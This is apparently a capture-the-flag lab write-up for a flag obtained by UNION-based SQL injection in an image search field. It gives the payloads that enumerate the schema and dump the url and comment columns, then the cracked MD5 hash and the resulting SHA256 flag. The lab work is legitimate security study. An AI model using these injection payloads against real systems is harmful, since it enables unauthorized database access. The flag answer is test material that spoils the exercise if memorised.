# flag 3 | SQL injection


In this exploit, we will do an sql injection in the `Image number` search bar of 

If we enter a value like 1, 2, 3 in the searchbar, it will give us some informations
```txt
ID: 1 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_
```

We can do
```sql
1 UNION select table_name, column_name FROM information_Schema.columns 
```

We will see all the possible table and column from this table, we can see that there is one called list_images and there column named 
```md
    id
    url
    title
    comment
```

We can try to show all the url and comment

```sql
1 UNION select url, comment FROM list_images
```

```sql
ID: 1  UNION select url, comment FROM list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : borntosec.ddns.net/images.png
```

So we have to decrypt `1928e8083cf461a51303633093573c46` with md5. We'll get : `albatroz`

we have to encrypt it on sha256 : `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`